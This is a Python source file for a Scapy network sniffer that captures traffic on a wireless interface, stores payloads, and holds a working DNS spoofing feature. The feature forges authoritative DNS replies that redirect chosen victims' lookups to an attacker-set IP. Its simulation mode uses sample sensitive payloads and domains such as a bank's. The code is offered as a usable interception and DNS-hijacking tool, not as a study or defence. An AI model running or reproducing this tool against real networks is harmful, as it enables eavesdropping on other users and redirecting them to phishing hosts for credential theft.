from scapy.all import sniff, IP, TCP, UDP, Raw, Ether, DNS, DNSQR, DNSRR, sendp
from .database import save_packet
from .analyzer import analyze_payload
import threading
import time
import random

class Sniffer:
    def __init__(self, interface="wlan0", simulation=False):
        self.interface = interface
        self.simulation = simulation
        self.running = False
        self.thread = None
        self.spoof_rules = {}  # (src_ip, domain) -> spoofed_ip

    def start(self):
        if self.running:
            return
        self.running = True
        if self.simulation:
            self.thread = threading.Thread(target=self._simulate_sniffing)
        else:
            self.thread = threading.Thread(target=self._real_sniffing)
        self.thread.daemon = True
        self.thread.start()
        print(f"Sniffer started on {self.interface} (Simulation: {self.simulation})")

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
        print("Sniffer stopped.")

    def add_spoof_rule(self, target_ip, domain, spoof_ip):
        self.spoof_rules[(target_ip, domain.strip('.'))] = spoof_ip
        print(f"Added spoof rule: {target_ip} looking for {domain} -> {spoof_ip}")

    def remove_spoof_rule(self, target_ip, domain):
        key = (target_ip, domain.strip('.'))
        if key in self.spoof_rules:
            del self.spoof_rules[key]
            print(f"Removed spoof rule for {target_ip} and {domain}")

    def _process_packet(self, pkt):
        if IP in pkt:
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            src_mac = pkt.src
            payload = ""
            analysis = {}
            
            # Detect DNS Queries
            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
                try:
                    qname = pkt[DNSQR].qname.decode('utf-8').strip('.')
                    payload = f"DNS Query: {qname}"
                    analysis["dns_query"] = [qname]
                    
                    # Check for spoofing rules
                    if (src_ip, qname) in self.spoof_rules:
                        spoof_ip = self.spoof_rules[(src_ip, qname)]
                        self._send_spoofed_dns_response(pkt, qname, spoof_ip)
                        analysis["spoofed"] = [f"Redirected to {spoof_ip}"]
                except Exception as e:
                    print(f"Error parsing DNS: {e}")

            if Raw in pkt and not payload:
                try:
                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                except Exception:
                    pass
            
            if payload:
                if not analysis:
                    analysis = analyze_payload(payload)
                save_packet(src_ip, src_mac, dst_ip, payload, analysis)

    def _send_spoofed_dns_response(self, pkt, qname, spoof_ip):
        if self.simulation:
            print(f"SIMULATION: Sending spoofed DNS response for {qname} to {pkt[IP].src} -> {spoof_ip}")
            return

        try:
            eth = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip))
            
            spoof_pkt = eth/ip/udp/dns
            sendp(spoof_pkt, iface=self.interface, verbose=False)
            print(f"Sent spoofed DNS response for {qname} to {pkt[IP].src} -> {spoof_ip}")
        except Exception as e:
            print(f"Failed to send spoofed DNS response: {e}")

    def _real_sniffing(self):
        sniff(iface=self.interface, prn=self._process_packet, stop_filter=lambda x: not self.running)

    def _simulate_sniffing(self):
        ips = ["192.168.1.10", "192.168.1.11", "192.168.1.12"]
        macs = ["00:11:22:33:44:55", "AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66"]
        payloads = [
            "User logging in with email test@example.com",
            "Browsing http://unsafe-site.com/login",
            "Secret data: 4111-2222-3333-4444",
            "Message from Alice to Bob",
            "Visiting https://google.com for research",
            "My phone number is +1 555 123 4567"
        ]
        domains = [
            "google.com", "facebook.com", "bankofamerica.com", "evil.com",
            "api.github.com", "slack.com", "aws.amazon.com", "netflix.com",
            "updates.windows.com", "tracking.doubleclick.net", "identity.google.com"
        ]
        
        while self.running:
            coin = random.random()
            src_ip = random.choice(ips)
            dst_ip = "8.8.8.8"
            src_mac = macs[ips.index(src_ip)]
            
            if coin < 0.3: # Simulate DNS Query
                domain = random.choice(domains)
                # Create a mock packet for _process_packet
                mock_pkt = Ether(src=src_mac, dst="00:11:22:33:44:55")/IP(src=src_ip, dst=dst_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                self._process_packet(mock_pkt)
            else:
                payload = random.choice(payloads)
                analysis = analyze_payload(payload)
                save_packet(src_ip, src_mac, dst_ip, payload, analysis)
            
            time.sleep(random.uniform(0.5, 2.0))

if __name__ == "__main__":
    from .database import init_db
    init_db()
    sniffer = Sniffer(simulation=True)
    sniffer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sniffer.stop()
